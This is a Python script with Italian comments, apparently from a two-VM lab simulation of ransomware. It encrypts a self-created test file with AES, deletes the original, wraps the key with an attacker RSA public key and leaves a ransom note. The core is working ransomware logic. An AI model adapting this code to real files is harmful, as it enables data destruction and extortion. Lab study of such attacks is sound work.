#(L'Attacco su VM 2)
#Questo script agisce come il malware sulla macchina della vittima.

# ransomware_attack.py - Eseguito su VM 2 (Vittima) per l'attacco

import os
import secrets
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
# Importa solo le funzioni necessarie da utils.py (Assumi che utils.py sia stato copiato,
# o che le funzioni siano state integrate/importate correttamente in un ambiente reale)
from vm1_attacker_server.utils import carica_chiave_rsa, cifra_aes, PUBLIC_KEY_FILE 

# --- Configurazione ---
TEST_DIR = "test_files"
TARGET_FILE = os.path.join(TEST_DIR, "FileToEncrypt.txt")
ENCRYPTED_AES_KEY_FILE = os.path.join(TEST_DIR, "encryptedSymmertricKey.key")
RANSOM_NOTE_FILE = os.path.join(TEST_DIR, "LEGGIMI_DECRIPTARE.txt")
ENCRYPTED_EXTENSION = ".crypted"

def prepara_ambiente():
    """Crea la directory di test e il file di esempio se non esistono."""
    if not os.path.exists(TEST_DIR):
        os.makedirs(TEST_DIR)
    if not os.path.exists(TARGET_FILE):
        with open(TARGET_FILE, "w") as f:
            f.write("Questo e' il file di dati aziendali Top Secret.")
        print(f"Creato file di test: '{TARGET_FILE}'")

def esegui_attacco():
    """Esegue la crittografia ibrida: AES per i dati, RSA per la chiave AES."""
    prepara_ambiente()
    print("\n--- INIZIO ATTACCO RANSOMWARE (VM 2) ---")

    # (1) Generazione della chiave simmetrica AES-256 (32 byte)
    chiave_aes = secrets.token_bytes(32)
    print("🔑 Chiave AES generata e conservata in memoria (Usa e Getta).")

    # (2) Cifratura del file della vittima con AES-CBC
    try:
        with open(TARGET_FILE, "rb") as f:
            dati_originali = f.read()
        
        dati_cifrati = cifra_aes(chiave_aes, dati_originali)
        
        # Salvataggio del file cifrato
        crypted_file = TARGET_FILE + ENCRYPTED_EXTENSION
        with open(crypted_file, "wb") as f:
            f.write(dati_cifrati)
            
        print(f"🔒 File '{TARGET_FILE}' cifrato e salvato come '{crypted_file}'")
        os.remove(TARGET_FILE) # Eliminazione del file originale
        
    except FileNotFoundError:
        print(f"❌ Errore: File da cifrare non trovato.")
        return

    # (3) Caricamento della chiave pubblica RSA (ottenuta dall'aggressore/VM 1)
    try:
        chiave_pubblica = carica_chiave_rsa(PUBLIC_KEY_FILE, is_private=False)
    except FileNotFoundError:
        print(f"❌ Errore: Chiave pubblica '{PUBLIC_KEY_FILE}' non trovata. Eseguire 'utils.py' su VM 1 e copiare la chiave.")
        return

    # (4) Crittografia della chiave AES con la chiave pubblica RSA (Key Wrapping)
    chiave_aes_cifrata = chiave_pubblica.encrypt(
        chiave_aes,
        asym_padding.OAEP(
            mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    # (5) Salvataggio della chiave AES cifrata (il "riscatto" da inviare)
    with open(ENCRYPTED_AES_KEY_FILE, "wb") as key_file:
        key_file.write(chiave_aes_cifrata)
        
    print(f"🔑 Chiave AES cifrata con RSA e salvata come '{ENCRYPTED_AES_KEY_FILE}'")

    # (6) Creazione della nota di riscatto
    with open(RANSOM_NOTE_FILE, "w") as f:
        f.write("I tuoi file sono cifrati. Per la decifratura, invia la chiave cifrata (encryptedSymmertricKey.key) al nostro indirizzo IP di riscatto e segui le istruzioni.")
    
    print("--- ATTACCO RANSOMWARE COMPLETATO. CHIAVE PRONTA PER L'INVIO. ---")

if __name__ == "__main__":
    esegui_attacco()
